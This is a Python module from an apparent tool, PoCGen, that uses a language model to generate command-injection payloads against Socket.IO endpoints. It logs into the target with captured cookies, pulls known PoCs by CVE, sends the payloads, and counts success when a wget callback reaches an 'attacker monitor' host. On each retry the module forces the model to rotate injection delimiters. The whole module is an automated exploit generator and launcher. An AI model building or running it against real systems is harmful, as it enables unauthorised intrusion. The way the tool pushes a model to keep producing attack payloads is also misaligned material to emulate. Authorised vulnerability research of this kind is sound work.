from __future__ import annotations

from datetime import datetime
from pathlib import Path
import time
from typing import List, Optional

from rich.console import Console

from PoCGen.config.config import SETTINGS
from PoCGen.llm.client import ChatMessage, LLMClient
from PoCGen.prompts.templates import build_prompt_command_injection_socket
from PoCGen.core.sampler import sample_target_with_playwright
from PoCGen.core.target_profile import TargetSample
from PoCGen.tools.getWeb import get_web_infomation
from PoCGen.core.attacker_monitor import (
    AttackerMonitor,
    get_monitor_base_url,
    monitor_available,
    reset_external_monitor,
    wait_for_external_monitor,
)
from PoCGen.core.vuln_analyzer import analyze_vulnerability, VulnAnalysisResult
from PoCGen.core.models import (
    AttemptResult,
    GenerationResult,
    HTTPMessage,
    SocketEventMessage,
    ValidationResult,
    VulnHandler,
)
from .postprocess import split_socket_messages, save_socket_messages
from .validators import parse_and_validate
from .remote_validator import validate_socket_events

console = Console()


_DELIMITER_ORDER = ["$()", "`...`", ";...;"]


def _build_socket_retry_prompt(previous_raw_output: str, feedback_text: Optional[str], attempt_index: int = 1) -> str:
    parts: List[str] = [
        "Previous generated socket payload failed. Generate ONE corrected JSON payload.",
        "Keep output format unchanged: exactly one JSON object matching the required schema.",
        "Failed payload from previous attempt:\n" + (previous_raw_output or "<empty>"),
    ]
    if feedback_text:
        parts.append("Error report for correction:\n" + feedback_text)
    delim_idx = min(attempt_index, len(_DELIMITER_ORDER) - 1)
    forced_delim = _DELIMITER_ORDER[delim_idx]
    parts.append(
        f"MANDATORY delimiter change for this attempt: you MUST use the '{forced_delim}' injection style. "
        f"Do NOT reuse the delimiter from the failed payload. Delimiter rotation order: {', '.join(_DELIMITER_ORDER)}. "
        f"This is attempt #{attempt_index + 1}, so use '{forced_delim}'."
    )
    return "\n\n".join(parts)


class CommandInjectionSocketHandler(VulnHandler):
    name = "command_injection_socket"

    def build_messages(
        self,
        description: str,
        code_texts: List[str],
        target: Optional[str],
        payload: str,
        target_profile: Optional[str] = None,
        validation_feedback: Optional[str] = None,
        vuln_analysis: Optional[str] = None,
        web_info: Optional[str] = None,
    ) -> List[dict]:
        msgs = build_prompt_command_injection_socket(
            description=description,
            code_files=code_texts,
            target=target,
            payload=payload,
            target_profile=target_profile,
            validation_feedback=validation_feedback,
            vuln_analysis=vuln_analysis,
            web_info=web_info,
        )
        return [m.model_dump() for m in msgs]


def generate_command_injection_socket(
    description: str,
    code_texts: List[str],
    target: Optional[str] = None,
    vuln_type: Optional[str] = None,
    payload: Optional[str] = None,
    probe_target: bool = False,
    auto_validate: bool = False,
    max_iterations: Optional[int] = None,
    stop_on_success: Optional[bool] = None,
    cvenumber: Optional[str] = None,
    login_url: Optional[str] = None,
    login_username: Optional[str] = None,
    login_password: Optional[str] = None,
    login_user_field: str = "username",
    login_pass_field: str = "password",
    use_browser_login: bool = False,
    binary_path: Optional[str] = None,
) -> GenerationResult:
    handler_key = vuln_type or CommandInjectionSocketHandler.name
    handler = CommandInjectionSocketHandler()
    final_payload = payload or SETTINGS.payload
    web_info_block: Optional[str] = None
    if cvenumber:
        web_data = get_web_infomation(cvenumber)
        if web_data:
            parts = []
            if web_data.get("info"):
                parts.append(f"Vulnerability Summary: {web_data['info']}")
            if web_data.get("reason"):
                parts.append(f"Root Cause: {web_data['reason']}")
            if web_data.get("webpoc"):
                parts.append(f"Known PoC:\n{web_data['webpoc']}")
            web_info_block = "\n\n".join(parts)

    if cvenumber and description:
        import re
        desc_cves = set(re.findall(r'CVE-\d{4}-\d{4,}', description, re.IGNORECASE))
        if desc_cves and cvenumber.upper() not in {c.upper() for c in desc_cves}:
            console.print(
                f"[bold red]WARNING: --CVENumber {cvenumber} does not match CVE(s) found in description: {', '.join(sorted(desc_cves))}. "
                f"Web crawl data may describe a different vulnerability!"
            )

    chat_log_dir = Path(__file__).resolve().parent.parent.parent.parent / "logs" / "chat"
    chat_log_dir.mkdir(parents=True, exist_ok=True)
    chat_log_path = chat_log_dir / f"chat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def log_chat(text: str) -> None:
        try:
            ts = datetime.now().isoformat(timespec="seconds")
            with open(chat_log_path, "a", encoding="utf-8") as fh:
                fh.write(f"[{ts}] {text}\n")
        except Exception:
            pass

    log_chat(
        "Initial input:\n"
        f"description: {description}\n"
        f"target: {target or '<none>'}\n"
        f"vuln_type: {handler_key}\n"
        f"payload: {final_payload}\n"
        f"binary_path: {binary_path or '<none>'}"
    )

    # ------------------------------------------------------------------
    # Vulnerability analysis (source code + optional IDA MCP binary data)
    # ------------------------------------------------------------------
    vuln_analysis_block: Optional[str] = None

    if binary_path:
        console.print("[bold]Vulnerability analysis (source + binary)")
        try:
            vuln_result = analyze_vulnerability(
                description=description,
                code_texts=code_texts,
                cvenumber=cvenumber,
                binary_path=binary_path,
            )
            log_chat(f"Vuln analysis result: valid={vuln_result.is_valid}, summary={vuln_result.summary}")
            if vuln_result.is_valid:
                vuln_analysis_block = vuln_result.as_prompt_block
            else:
                vuln_analysis_block = vuln_result.raw_output[:3000]
        except Exception as exc:
            console.print(f"[yellow]Vulnerability analysis failed: {exc}")
            log_chat(f"Vuln analysis exception: {exc}")
    else:
        console.print("[dim]No binary path provided; skipping vulnerability analysis")

    max_iters = max(1, max_iterations or SETTINGS.max_iterations)
    if not auto_validate:
        max_iters = 1
    stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
    monitor_wait = SETTINGS.monitor_timeout
    out_dir = SETTINGS.socket_save_dir
    attempts: List[AttemptResult] = []
    feedback_text: Optional[str] = None
    overall_success = False
    last_raw_output = ""
    last_events: List[SocketEventMessage] = []
    last_saved_paths: List[str] = []
    last_validation_results: Optional[List[ValidationResult]] = None

    monitor: Optional[AttackerMonitor] = None
    external_monitor_url: Optional[str] = None
    monitor_base_url = get_monitor_base_url()
    monitor_running = False
    if auto_validate:
        if monitor_available(monitor_base_url):
            external_monitor_url = monitor_base_url
            monitor_running = True
            console.print(f"[cyan]Reusing existing attacker monitor at {monitor_base_url}")
            reset_external_monitor(monitor_base_url)
        else:
            monitor = AttackerMonitor(monitor_base_url, timeout=monitor_wait)
            monitor.start()
            monitor_running = monitor.is_running()
            if monitor_running:
                console.print(f"[green]Attacker monitor listening on {monitor_base_url}")
            else:
                console.print("[yellow]Warning: attacker monitor failed to start; success detection will be disabled for this run")

    generation_start_ts = time.time()
    llm_client = LLMClient()

    try:
        target_profile_block: Optional[str] = None
        if probe_target and target:
            if use_browser_login:
                try:
                    sample: TargetSample = sample_target_with_playwright(
                        target,
                        login_url=login_url,
                        login_username=login_username,
                        login_password=login_password,
                        login_user_field=login_user_field,
                        login_pass_field=login_pass_field,
                        headless=SETTINGS.browser_headless,
                        capture_posts=False,
                        capture_cookies=True,
                        capture_socket_messages=True,
                    )
                    target_profile_block = _format_socket_sample_prompt(sample)
                    if target_profile_block:
                        console.print("[cyan]Captured socket traffic sample for prompt context")
                    else:
                        console.print("[yellow]Socket sampling completed but no frames were recorded")
                except Exception as exc:
                    console.print(f"[yellow]Warning: failed to capture socket sample from {target}: {exc}")
            else:
                console.print("[yellow]probe_target currently requires --browser-login; skipping socket sampling")

        # Build initial messages AFTER sampling so target_profile is available
        initial_messages: List[ChatMessage] = [
            ChatMessage(**m)
            for m in handler.build_messages(
                description,
                code_texts,
                target,
                final_payload,
                target_profile_block,
                None,
                vuln_analysis_block,
                web_info_block,
            )
        ]

        for attempt_index in range(max_iters):
            console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters}[/bold]")

            log_chat(f"Attempt {attempt_index + 1} starting")
            if feedback_text:
                log_chat(f"Feedback provided to model:\n{feedback_text}")

            messages: List[ChatMessage] = []
            if attempt_index == 0:
                messages = list(initial_messages)
                if target_profile_block:
                    messages.append(ChatMessage(role="user", content=f"Captured socket sample:\n{target_profile_block}"))
            else:
                retry_prompt = _build_socket_retry_prompt(last_raw_output, feedback_text, attempt_index)
                messages = [
                    ChatMessage(role="system", content=initial_messages[0].content),
                    ChatMessage(role="user", content=initial_messages[1].content),
                    ChatMessage(role="user", content=retry_prompt),
                ]
                log_chat("Retry mode enabled: full context + failed payload + error feedback sent to model")

            log_chat(
                "Model input messages:\n" +
                "\n".join(f"- {m.role}: {m.content}" for m in messages)
            )

            raw_output = llm_client.chat(messages, temperature=SETTINGS.temperature, max_tokens=SETTINGS.max_tokens)

            log_chat("Model output:\n" + raw_output)

            raw_messages = split_socket_messages(raw_output)
            if not raw_messages and raw_output.strip():
                raw_messages = [raw_output.strip()]

            if raw_messages:
                saved_paths = save_socket_messages(raw_messages, out_dir)
                console.print(
                    f"Saved {len(saved_paths)} socket PoC request(s) to: {out_dir}"
                )
            else:
                saved_paths = []
                console.print(
                    f"[yellow]Attempt {attempt_index + 1} produced no parseable socket payload"
                )

            socket_events: List[SocketEventMessage] = []
            parse_issues: List[str] = []
            for idx, raw in enumerate(raw_messages):
                try:
                    msg, errs = parse_and_validate(raw)
                    socket_events.append(msg)
                    parse_issues.extend(f"Event #{idx}: {err}" for err in errs)
                except Exception as exc:
                    parse_issues.append(f"Event #{idx} parse error: {exc}")

            validation_results: Optional[List[ValidationResult]] = None
            validation_error: Optional[str] = None
            if auto_validate and socket_events:
                try:
                    validation_results = validate_socket_events(socket_events, target)
                    for res in validation_results:
                        if res.success:
                            console.print(
                                f"[green]Event #{res.request_index} dispatched successfully ({res.url})"
                            )
                        else:
                            detail = res.error or "no response"
                            preview = (res.response_preview or "").strip()
                            if preview:
                                preview = preview[:200] + ("..." if len(preview) > 200 else "")
                                detail += f" | {preview}"
                            console.print(
                                f"[yellow]Event #{res.request_index} validation failed ({detail})"
                            )
                except Exception as exc:
                    console.print(f"[yellow]Warning: socket validation failed: {exc}")
                    validation_results = None
                    validation_error = str(exc)

            monitor_hit = False
            monitor_summary: Optional[str] = None
            if monitor_running and socket_events:
                if external_monitor_url:
                    monitor_hit, monitor_summary = wait_for_external_monitor(
                        external_monitor_url, monitor_wait, since_ts=generation_start_ts
                    )
                else:
                    monitor_hit = monitor.wait_for_hit(monitor_wait)
                    monitor_summary = monitor.last_request_summary

                if monitor_hit:
                    console.print("[bold green]Attacker monitor recorded a callback![/bold green]")
                    if monitor_summary:
                        console.print(monitor_summary)
                else:
                    console.print(
                        f"[yellow]No callback received on attacker monitor within {monitor_wait} seconds"
                    )

            feedback_for_next = None
            if not monitor_hit:
                feedback_for_next = _build_socket_attempt_feedback(
                    parse_issues,
                    validation_results,
                    final_payload,
                    monitor_running,
                    validation_error,
                )

            attempts.append(
                AttemptResult(
                    attempt_index=attempt_index,
                    raw_output=raw_output,
                    requests=[],
                    saved_paths=saved_paths,
                    validation_results=validation_results,
                    monitor_hit=monitor_hit,
                    monitor_summary=monitor_summary,
                    feedback=feedback_for_next,
                    socket_events=socket_events,
                )
            )

            last_raw_output = raw_output
            last_events = socket_events
            last_saved_paths = saved_paths
            last_validation_results = validation_results
            overall_success = overall_success or monitor_hit
            feedback_text = feedback_for_next

            if monitor_hit and stop_after_success:
                console.print("[bold green]Success criteria met; stopping further attempts[/bold green]")
                break

            if attempt_index + 1 < max_iters:
                if feedback_text:
                    console.print("[cyan]Prepared feedback for next attempt (feedback logged, not printed to console)")
                elif not monitor_hit:
                    console.print("[yellow]No specific feedback generated; will request model to adjust strategy")

        return GenerationResult(
            raw_output=last_raw_output,
            requests=[],
            saved_paths=last_saved_paths,
            validation_results=last_validation_results,
            attempts=attempts,
            success=overall_success,
            socket_events=last_events,
        )
    finally:
        llm_client.close()
        if monitor:
            monitor.stop()


def _format_socket_sample_prompt(sample: TargetSample) -> Optional[str]:
    if not sample.socket_samples:
        return None
    block: List[str] = [
        "Socket.IO sampling blueprint:",
        f"Target URL: {sample.url}",
    ]
    if sample.cookies_header:
        block.append(f"Cookie header (post-login): {sample.cookies_header}")
    for idx, raw in enumerate(sample.socket_samples[:3], start=1):
        snippet = raw.strip()
        if len(snippet) > 1500:
            snippet = snippet[:1500] + "\n... <truncated>"
        block.append(f"Sample #{idx}:\n{snippet}")
    return "\n\n".join(block)


def _build_socket_attempt_feedback(
    parse_issues: List[str],
    validation_results: Optional[List[ValidationResult]],
    payload: str,
    monitor_active: bool,
    validation_error: Optional[str] = None,
) -> Optional[str]:
    messages: List[str] = []
    if parse_issues:
        bullet = "\n".join(f"- {issue}" for issue in parse_issues)
        messages.append("Socket payload parsing/validation issues detected:\n" + bullet)

    validation_summaries: List[str] = []
    failed_validation: List[ValidationResult] = []
    if validation_results is not None:
        for res in validation_results:
            status = "success" if res.success else "failure"
            detail = res.error or (res.response_preview or "").strip() or "no response"
            line = f"Event #{res.request_index}: {status} ({res.url})"
            if detail:
                line += f" -> {detail}"
            validation_summaries.append(line)
            if not res.success:
                failed_validation.append(res)
        if validation_summaries:
            messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))
    elif validation_error:
        messages.append(f"Target validation did not run due to error: {validation_error}")
    else:
        messages.append("Target validation did not run or returned no results.")

    if monitor_active:
        messages.append(
            "Attacker monitor did NOT receive the expected wget callback. Ensure the Socket.IO payload executes wget "
            f"{payload} directly (no URL encoding of separators) and that the vulnerable argument is actually controllable."
        )
    else:
        messages.append(
            "Attacker monitor is unavailable, so success could not be confirmed automatically. Still refine the payload to trigger wget "
            f"{payload} if possible."
        )

    if parse_issues or failed_validation:
        messages.append(
            "Before the next attempt, tighten the JSON structure and payload:\n"
            "1) Schema: keep the keys exactly as requested (url, namespace, event, headers, cookies, wait_for_response, max_response_frames, payload).\n"
            "2) Payload: mirror the server's expected object layout and wrap the injection with the delimiter style observed in code (e.g., ';{payload};').\n"
            "3) Endpoint: ensure the ws/wss URL, namespace, and event names match the code blueprint; reuse any authentication cookies or headers from the sample.\n"
            "4) Responses: if redirects or auth failures occur, update cookies/headers accordingly and retry."
        )

    return "\n\n".join(messages) if messages else None